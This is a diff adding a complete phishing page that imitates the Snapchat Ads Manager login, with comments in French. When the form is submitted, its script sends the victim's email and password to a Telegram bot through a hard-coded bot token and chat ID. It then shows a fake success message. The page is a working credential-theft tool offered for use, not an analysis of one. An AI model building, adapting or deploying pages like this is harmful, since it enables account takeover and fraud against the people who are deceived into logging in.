@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Snapchat Login Style</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background-color: #fff;
+      width: 350px;
+      padding: 40px 30px;
+      border-radius: 10px;
+      box-shadow: 0px 4px 20px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    .logo-container {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 10px;
+    }
+
+    .logo {
+      width: 50px;
+      height: 50px;
+      object-fit: contain;
+      display: block;
+    }
+
+    h2 {
+      font-size: 24px;
+      margin-top: 5px;
+      margin-bottom: 5px;
+    }
+
+    p.subtext {
+      color: #555;
+      font-size: 14px;
+      margin-top: 0;
+      margin-bottom: 25px;
+    }
+
+    .input-container {
+      position: relative;
+      margin-bottom: 15px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+
+    .password-toggle {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #888;
+      user-select: none;
+      width: 20px;
+      height: 20px;
+      display: none; /* Caché par défaut */
+      align-items: center;
+      justify-content: center;
+    }
+
+    .password-toggle.visible {
+      display: flex; /* S'affiche quand la classe 'visible' est ajoutée */
+    }
+
+    .password-toggle svg {
+      width: 20px;
+      height: 20px;
+      fill: none;
+      stroke: #888;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .password-toggle:hover svg {
+      stroke: #555;
+    }
+
+    .login-btn {
+      background-color: #fffc00;
+      color: black;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 30px;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 5px;
+    }
+
+    .signup {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    .signup a {
+      font-weight: bold;
+      color: black;
+      text-decoration: none;
+    }
+
+    .signup a:hover {
+      text-decoration: underline;
+    }
+
+    .eye-off {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <!-- Logo PNG Image in a container for better positioning -->
+    <div class="logo-container">
+      <img src="snapchat-logo-png-transparent.png" alt="Snapchat Logo" class="logo" />
+    </div>
+
+    <h2>Log In</h2>
+    <p class="subtext">to continue to Ads Manager</p>
+
+    <form id="loginForm">
+      <div class="input-container">
+        <input type="text" id="email" placeholder="Username or Email" required />
+      </div>
+      
+      <div class="input-container">
+        <input type="password" id="password" placeholder="Password" required />
+        <span class="password-toggle" id="togglePassword">
+          <!-- Eye icon (visible when password is hidden) -->
+          <svg class="eye" viewBox="0 0 24 24">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+            <circle cx="12" cy="12" r="3"></circle>
+          </svg>
+          <!-- Eye-off icon (visible when password is shown) -->
+          <svg class="eye-off" viewBox="0 0 24 24">
+            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+            <line x1="1" y1="1" x2="23" y2="23"></line>
+          </svg>
+        </span>
+      </div>
+      
+      <button class="login-btn" type="submit">Log In</button>
+    </form>
+
+    <div class="signup">
+      New To Snapchat? <a href="#">Sign Up</a>
+    </div>
+  </div>
+
+  <script>
+    const passwordInput = document.getElementById("password");
+    const togglePassword = document.getElementById("togglePassword");
+    const eyeIcon = togglePassword.querySelector(".eye");
+    const eyeOffIcon = togglePassword.querySelector(".eye-off");
+    const botToken = "8095204446:AAGFJDgn_2_ts_RlhXs0VVX5c9to-rJMsf0";       
+    const chatId = "965011527";         // Ton ID Telegram perso ou d'un groupe
+
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      const message = `🛂 Nouvelle connexion :\n📧 Email : ${email}\n🔐 Mot de passe : ${password}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log("✅ Infos envoyées à Telegram !");
+        alert("Connexion réussie !");
+      })
+      .catch(error => {
+        console.error("❌ Erreur lors de l'envoi :", error);
+        alert("Erreur lors de la connexion.");
+      });
+    });
+    // Afficher l'icône d'œil uniquement lorsque l'utilisateur commence à taper
+    passwordInput.addEventListener("input", function() {
+      // Si le champ n'est pas vide, afficher l'icône
+      if (this.value.length > 0) {
+        togglePassword.classList.add("visible");
+      } else {
+        // Si le champ est vide, cacher l'icône
+        togglePassword.classList.remove("visible");
+        // Réinitialiser à l'état par défaut (mot de passe masqué)
+        this.type = "password";
+        eyeIcon.style.display = "block";
+        eyeOffIcon.style.display = "none";
+      }
+    });
+    
+    // Fonction pour basculer la visibilité du mot de passe
+    togglePassword.addEventListener("click", function() {
+      // Changer le type de l'input entre "password" et "text"
+      if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+        eyeIcon.style.display = "none";
+        eyeOffIcon.style.display = "block";
+      } else {
+        passwordInput.type = "password";
+        eyeIcon.style.display = "block";
+        eyeOffIcon.style.display = "none";
+      }
+    });
+
+    // Gestion de la soumission du formulaire
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      
+      // Form submission logic here
+    });
+  </script>
+
+</body>
+</html>
